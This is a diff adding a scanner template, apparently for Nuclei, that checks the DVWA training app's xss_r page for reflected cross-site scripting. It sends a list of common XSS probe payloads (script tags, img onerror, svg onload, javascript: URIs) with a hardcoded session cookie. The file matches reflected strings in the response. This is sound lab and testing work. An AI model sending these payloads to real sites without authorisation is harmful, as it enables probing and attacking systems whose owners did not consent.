@@ -1,0 +1,44 @@
+id: dvwa-xss-reflected
+
+info:
+  name: DVWA Reflected XSS Check
+  author: van
+  severity: medium
+  description: |
+    Kiểm thử lỗi Reflected XSS trên trang xss_r của DVWA.
+    Payload XSS được phản hồi lại trong nội dung HTML.
+  tags: dvwa,xss,reflected
+
+variables:
+  payload: "<script>alert(1337)</script>"
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/DVWA/vulnerabilities/xss_r/?name={{payload}}&Submit=Submit"
+
+    headers:
+      Cookie: "PHPSESSID=12g9sj6gdknke4870ld4boosib; security=impossible"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
+    
+    payloads:
+      payload:
+        - "<script>alert('XSS')</script>"
+        - "<img src=x onerror=alert('XSS')>"
+        - "\"><script>alert('XSS')</script>"
+        - "<svg/onload=alert('XSS')>"
+        - "jaVaScript:alert('XSS')"
+        - "<body onload=alert('XSS')>"
+        - "%3Cscript%3Ealert('XSS')%3C/script%3E"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert('XSS')</script>"
+          - "onerror=alert('XSS')"
+          - "onload=alert('XSS')"
+        condition: or
+      - type: status
+        status:
+          - 200
